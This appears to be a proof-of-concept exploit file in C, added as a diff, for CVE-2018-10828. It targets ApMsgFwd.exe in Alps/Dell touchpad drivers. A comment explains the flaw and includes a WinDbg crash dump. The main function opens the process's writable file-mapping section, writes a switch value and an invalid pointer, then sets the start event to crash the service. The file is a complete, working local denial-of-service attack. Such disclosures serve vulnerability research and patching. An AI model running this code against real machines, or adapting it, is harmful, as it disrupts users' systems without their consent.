@@ -1,0 +1,112 @@
+/*
+Title: Dell Touchpad - ApMsgFwd.exe Denial Of Service
+Author: Souhail Hammou
+Vendor Homepage: https://www.alps.com/
+Tested on : Alps Pointing-device Driver 10.1.101.207
+CVE: CVE-2018-10828
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+
+/*
+Details:
+==========
+ApMsgFwd.exe belonging to Dell Touchpad, ALPS Touchpad driver, ALPS pointing-device for VAIO, Thinkpad Ultranav Driver ..etc 
+allows the current user to map and write to the "ApMsgFwd File Mapping Object" section. 
+ApMsgFwd.exe uses the data written to the section as arguments to functions. 
+This causes a denial of service condition when invalid pointers are written to the mapped section. 
+
+The crash :
+===========
+(b88.aa0): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+KERNELBASE!MultiByteToWideChar+0x3d8:
+00007ffc`06422e08 443830          cmp     byte ptr [rax],r14b ds:d05d05d0`5d05d05d=??
+0:004> r
+rax=d05d05d05d05d05d rbx=00000000000004e4 rcx=000000007fffffff
+rdx=0000000000000000 rsi=00000000ffffffff rdi=d05d05d05d05d05d
+rip=00007ffc06422e08 rsp=000000000272fae0 rbp=000000000272fb59
+ r8=0000000000000000  r9=00000000ffffffff r10=0000000000000000
+r11=000000000272fbc0 r12=00000000000001f4 r13=0000000000000000
+r14=0000000000000000 r15=0000000000563e40
+iopl=0         nv up ei pl zr na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+KERNELBASE!MultiByteToWideChar+0x3d8:
+00007ffc`06422e08 443830          cmp     byte ptr [rax],r14b ds:d05d05d0`5d05d05d=??
+
+
+0:001> lm v m ApMsgFwd
+Browse full module list
+start             end                 module name
+00000000`00400000 00000000`00415000   ApMsgFwd   (no symbols)
+    Loaded symbol image file: C:\Program Files\DellTPad\ApMsgFwd.exe
+    Image path: C:\Program Files\DellTPad\ApMsgFwd.exe
+    Image name: ApMsgFwd.exe
+    Browse all global symbols  functions  data
+    Timestamp:        Tue Jul  1 09:03:05 2014 (53B27949)
+    CheckSum:         00020F5D
+    ImageSize:        00015000
+    File version:     8.1.0.44
+    Product version:  8.1.0.44
+    File flags:       0 (Mask 3F)
+    File OS:          40004 NT Win32
+    File type:        1.0 App
+    File date:        00000000.00000000
+    Translations:     0411.04b0
+    CompanyName:      Alps Electric Co., Ltd.
+    ProductName:      ApMsgFwd
+    InternalName:     ApMsgFwd
+    OriginalFilename: ApMsgFwd.exe
+    ProductVersion:   8, 1, 0, 44
+    FileVersion:      8, 1, 0, 44
+    PrivateBuild:     8, 1, 0, 44
+    SpecialBuild:     8, 1, 0, 44
+    FileDescription:  ApMsgFwd
+    LegalCopyright:   Copyright (C) 2006-2014 Alps Electric Co., Ltd.
+    LegalTrademarks:  Copyright (C) 2006-2014 Alps Electric Co., Ltd.
+    Comments:         Copyright (C) 2006-2014 Alps Electric Co., Ltd.
+*/
+int main(int argc, char** argv)
+{
+    HANDLE ApMpHnd,StartEvtHnd,KeyHnd;
+    PBYTE MappedBuf;
+
+    if ( ! (ApMpHnd = OpenFileMappingA(FILE_MAP_WRITE,FALSE,"ApMsgFwd File Mapping Object") ) )
+    {
+        printf("OpenFileMapping Failed !\n");
+        goto ret;
+    }
+
+    if ( ! ( MappedBuf = MapViewOfFile(ApMpHnd,FILE_MAP_WRITE,0,0,0x1A0) ) )
+    {
+        printf("MapViewOfFile Failed !\n");
+        goto cleanup_0;
+    }
+
+    StartEvtHnd = OpenEventA(EVENT_MODIFY_STATE,FALSE,"ApMsgFwd Event Start");
+
+    if ( ! StartEvtHnd )
+    {
+        printf("OpenEvent Failed !\n");
+        goto cleanup_1;
+    }
+
+    ZeroMemory(MappedBuf,0x1A0);
+    *MappedBuf = 9; //switch case 9
+    *(DWORD*)(MappedBuf + 0x60) = 0x5D05D05D;
+    *(DWORD*)(MappedBuf + 0x64) = 0xD05D05D0;
+
+    /*Wake up the waiting thread*/
+    SetEvent(StartEvtHnd);
+    
+    CloseHandle(StartEvtHnd);
+cleanup_1:
+    UnmapViewOfFile(MappedBuf);
+cleanup_0:
+    CloseHandle(ApMpHnd);
+ret:
+    return 0;
+}
